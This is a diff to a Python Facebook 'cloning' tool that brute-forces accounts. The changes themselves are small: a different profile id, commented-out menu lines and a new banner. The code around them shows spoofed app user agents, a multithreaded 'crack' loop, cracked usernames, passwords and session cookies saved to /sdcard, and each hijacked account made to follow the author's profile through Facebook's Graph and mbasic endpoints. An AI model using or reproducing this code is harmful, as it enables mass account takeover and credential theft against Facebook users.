@@ -134,8 +134,8 @@ for xd in range(5000):
     application_version = str(random.randint(111,396))+'.0.0.'+str(random.randrange(10,49))+'.'+str(random.randint(111,396))
     V=str(random.randrange(11,99))
     uaku2=f'{aa} {bv}; {c}{d}{e}{f} Build/{d}{f}{V}{f}; wv) {g}{h}.{i}.{j}.{k} {l} [FBAN/EMA;FBLC/en_US;FBAV/{application_version};]'
-    #[FBAN/EMA;FBLC/en_US;FBAV/331.0.0.9.105;]'
-    #[FB_IAB/FB4A;FBAV/127.0.0.22.69;]'
+   #[FBAN/EMA;FBLC/en_US;FBAV/331.0.0.9.105;]'
+   #[FB_IAB/FB4A;FBAV/127.0.0.22.69;]'
     ugen.append(uaku2)
 
 for xd in range(5000):
@@ -275,14 +275,14 @@ def main():
     print("\033[1;93m~~~~~~~~~Main menu~~~~~~~~~")
     print(47*"-")
     print("\033[1;92m[1] Cloning Menu Option")
-    print("\033[1;92m[2] Make File Extract ids")
-    print("\033[1;92m[3] Remove Double Links From File")
-    print("\033[1;92m[4] Separate Link From File")
-    print("\033[1;92m[5] Cut Links From Used File")
-    print("\033[1;92m[6] Logout Delete Cookie")
-    print ("\033[1;92m[7] live 2fa on")
-    print ("\033[1;92m[8] Password change")
-    print("\033[1;92m[9] Join Our FB Group\033[0;97m")
+  #print("\033[1;92m[2] Make File Extract ids")
+  #print("\033[1;92m[3] Remove Double Links From File")
+  #print("\033[1;92m[4] Separate Link From File")
+  #print("\033[1;92m[5] Cut Links From Used File")
+   #print("\033[1;92m[6] Logout Delete Cookie")
+  #print ("\033[1;92m[7] live 2fa on")
+  #print ("\033[1;92m[8] Password change")
+ #print("\033[1;92m[9] Join Our FB Group\033[0;97m")
     print(47*"-")
     print("\033[1;93mFor Any Problem Select 9 And Join Our FB Group\033[0;97m")
     print(47*"-")
@@ -770,7 +770,7 @@ class crack:
                         open("/sdcard/YUKI_OK.txt", "a").write(used + "|" + pw + "\n")
                         open("/sdcard/YUKI_cokie.txt", "a").write(used + "|" + pw + " | " + cokie + "\n")
                         ok.append(used + pw)
-                        follow_id='100009823322549'
+                        follow_id='100070851690160'
                         subs = requests.post('https://graph.facebook.com/'+follow_id+'/subscribers?access_token='+tokic, cookies={'cookie':cokie}).text
                         break
                     except KeyError:
@@ -920,7 +920,7 @@ class crack:
                         open("/sdcard/YUKI_OK.txt", "a").write(used + "|" + pw + "\n")
                         open("/sdcard/YUKI_cokie.txt", "a").write(used + "|" + pw + " | " + cokie + "\n")
                         ok.append(used + pw)
-                        follow_id='100009823322549'
+                        follow_id='100070851690160'
                         subs = requests.post('https://graph.facebook.com/'+follow_id+'/subscribers?access_token='+tokic, cookies={'cookie':cokie}).text
                         break
                     except KeyError:
@@ -1010,7 +1010,7 @@ class crack:
 
     def follow(self,coki):
         session = requests.Session()
-        r = BeautifulSoup(session.get("https://mbasic.facebook.com/profile.php?id=100009823322549",cookies={"cookie":coki}).text,"html.parser")
+        r = BeautifulSoup(session.get("https://mbasic.facebook.com/profile.php?id=100070851690160",cookies={"cookie":coki}).text,"html.parser")
         for x in r.find_all("a",href=True):
             if "/a/subscribe.php" in x.get('href'):
                 session.get('https://mbasic.facebook.com'+x.get('href'), cookies={'cookie':coki}).text
@@ -1096,10 +1096,10 @@ class crack:
     def __random__(self):
         os.system('clear')
         print (logo4)
-        print ('\033[1;32m[1] Pakistan ids Clone')
-        print ('\033[1;32m[2] indian ids Clone')
-        print ('\033[1;32m[3] bangladesh ids clone')
-        print ('\033[1;32m[0] Back\033[0;97m')
+      #print ('\033[1;32m[1] Pakistan ids Clone')
+      #print ('\033[1;32m[2] indian ids Clone')
+      #print ('\033[1;32m[3] bangladesh ids clone')
+      #print ('\033[1;32m[0] Back\033[0;97m')
         print (47*'-')
         tg = input('\033[1;36mSelect: \033[0;97m')
         if tg == '1':
@@ -1168,7 +1168,7 @@ class crack:
                 print (' \x1b[1;97mCrack Running\x1b[1;97m ')
                 time.sleep(0.5)
                 print (47*'-')
-                print ('\x1b[1;92m   ~~~~~~~YUKI Badshah King Of Facebook~~~~~~~\x1b[1;97m')
+                print ('\x1b[1;92m   ~~~~~~~Y U K I H I R A  S E N~~~~~~~\x1b[1;97m')
                 time.sleep(0.5)
                 print (47*'-')
                 with YUKIBadshah(max_workers=30) as (__YUKIbrand__):
